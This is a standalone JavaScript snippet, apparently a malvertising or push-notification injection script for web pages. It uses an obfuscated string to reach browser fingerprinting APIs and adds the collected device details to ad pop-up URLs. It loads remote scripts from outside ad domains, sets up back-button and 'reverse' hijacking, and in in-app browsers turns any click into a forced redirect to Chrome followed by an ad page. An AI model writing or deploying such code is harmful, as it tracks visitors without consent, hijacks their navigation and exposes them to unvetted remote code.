(function() {
    var url = new URL(window.location.href);
    var pci = url.searchParams.get('1');

    var a = 'mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'
        .split('')
        .reduce((m, c, i) => (i % 2 ? m + c : c + m))
        .split('c');

    var Replace = (o => {
        var v = a[0];
        try {
            v += a[1] + Boolean(navigator[a[2]][a[3]]);
            navigator[a[2]][a[4]](o[0]).then(r => {
                o[0].forEach(k => {
                    v += r[k] ? a[5] + o[1][o[0].indexOf(k)] + a[6] + encodeURIComponent(r[k]) : a[0];
                });
            });
        } catch (e) {}
        return u => {
            // Открываем рекламное окно в новой вкладке
            window.open([u, v].join(u.indexOf(a[7]) > -1 ? a[5] : a[7]), '_blank');
        };
    })([[a[8], a[9], a[10], a[11]], [a[12], a[13], a[14], a[15]]]);

    var s = document.createElement('script');
    s.src = '//vuzismoothie.net/b12/92a26/mw.min.js?z=8759192&ymid=' + pci + '&sw=/sw-check-permissions-f7638.js&nouns=1';
    s.onload = function(result) {
        switch (result) {
            case 'onPermissionDefault':
            case 'onPermissionAllowed':
            case 'onPermissionDenied':
            case 'onAlreadySubscribed':
                Replace("//mouvaptauphe.net/4/8759177?ymid=" + pci);
                break;
            case 'onNotificationUnsupported':
                break;
        }
    };
    document.head.appendChild(s);

    // Back button settings
    var Back_Button_Zone = 8759177;
    var Domain_TB = "kaufoopaih.net";

    // Reverse logic
    var reverseScript = document.createElement('script');
    reverseScript.src = "https://desenteir.com/b12/92a26/reverse.min.js?sf=1";
    reverseScript.async = true;
    document.head.appendChild(reverseScript);

    // In-App Redirect Logic
    function isInApp() {
        const regex = new RegExp(`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))`, 'ig');
        return Boolean(navigator.userAgent.match(regex));
    }

    function initInappRd() {
        var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
        var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
        var trafficbackURL = "https://mouvaptauphe.net/4/8759177/?ymid=" + pci;
        var ua = navigator.userAgent.toLowerCase();

        if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
            document.body.addEventListener('click', function() {
                window.onbeforeunload = null;
                window.open(completeRedirectURL, '_blank'); // Открываем в новой вкладке
                setTimeout(function() {
                    window.open(trafficbackURL, '_blank'); // Открываем рекламную страницу в новой вкладке
                }, 1000);
            });
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initInappRd);
    } else {
        initInappRd();
    }
})();
